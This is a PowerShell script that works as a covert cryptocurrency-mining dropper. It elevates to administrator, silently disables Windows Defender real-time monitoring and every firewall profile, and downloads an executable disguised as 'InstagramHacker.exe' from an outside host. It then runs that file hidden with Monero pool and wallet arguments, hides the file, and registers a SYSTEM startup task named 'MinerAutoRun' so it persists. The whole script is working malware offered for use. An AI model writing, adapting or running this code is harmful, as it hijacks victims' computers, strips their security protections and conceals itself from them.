# Request admin rights if not already running as admin
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Requesting admin rights..."
    Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

# ✅ Step 1: Disable Windows Defender and Firewall (Silently with Admin Permissions)
Write-Host "Disabling Windows Defender and Firewall..."
$BatFile = "$env:TEMP\silent_defender.bat"
$BatContent = @"
@echo off
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring `$true" -WindowStyle Hidden
powershell -Command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False" -WindowStyle Hidden
exit
"@

# Create the BAT file
try {
    $BatContent | Out-File -FilePath $BatFile -Encoding ASCII
    Write-Host "Batch file created successfully."
} catch {
    Write-Host "Failed to create batch file: $_"
    exit
}

# Run the BAT file silently
try {
    Start-Process -FilePath $BatFile -WindowStyle Hidden
    Write-Host "Batch file executed successfully."
} catch {
    Write-Host "Failed to execute batch file: $_"
    exit
}

# Remove the BAT file after execution
Start-Sleep -Seconds 3
try {
    Remove-Item -Path $BatFile -Force
    Write-Host "Batch file removed successfully."
} catch {
    Write-Host "Failed to remove batch file: $_"
}

# ✅ Step 2: Define Variables
Write-Host "Defining variables..."
$FileUrl = "https://insta-drab-seven.vercel.app/api/download"  # Replace with actual link
$DownloadPath = "E:\InstagramHacker.exe"  # Save in E drive
$ExeArguments = "-o in.monero.herominers.com:1111 -u 44f5MX3ai3SXFyio93ocdjgBZ9XgcRnz1cxrAgGz7VaQKgHy5uf2zqNL4PxV2tJdgBTppnMGvr8Kw7W4iprNywAxUVKB9q1 -p King -a rx/0 -k --cpu --cpu-max-threads=70 --cuda --opencl"

# ✅ Step 3: Download the EXE file
Write-Host "Downloading EXE file..."
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $WebClient = New-Object System.Net.WebClient
    $WebClient.DownloadFile($FileUrl, $DownloadPath)
    Write-Host "EXE file downloaded successfully."
} catch {
    Write-Host "Failed to download EXE file: $_"
    exit
}



# ✅ Step 5: Execute the EXE file with Admin Rights
Write-Host "Executing EXE file with admin rights..."
try {
    Start-Process -FilePath $DownloadPath -ArgumentList $ExeArguments -Verb RunAs -WindowStyle Hidden
    Write-Host "EXE file executed successfully."
} catch {
    Write-Host "Failed to execute EXE file: $_"
}

# ✅ Step 6: Hide the Downloaded File
Write-Host "Hiding the downloaded file..."
try {
    Set-ItemProperty -Path $DownloadPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
    Write-Host "File hidden successfully."
} catch {
    Write-Host "Failed to hide file: $_"
}

# ✅ Step 7: Add Script to Startup (Runs on Boot)
Write-Host "Adding script to startup..."
$TaskName = "MinerAutoRun"
try {
    $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    $TaskTrigger = New-ScheduledTaskTrigger -AtStartup
    $TaskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger $TaskTrigger -Principal $TaskPrincipal -Settings $TaskSettings -Force
    Write-Host "Startup task created successfully."
} catch {
    Write-Host "Failed to create startup task: $_"
}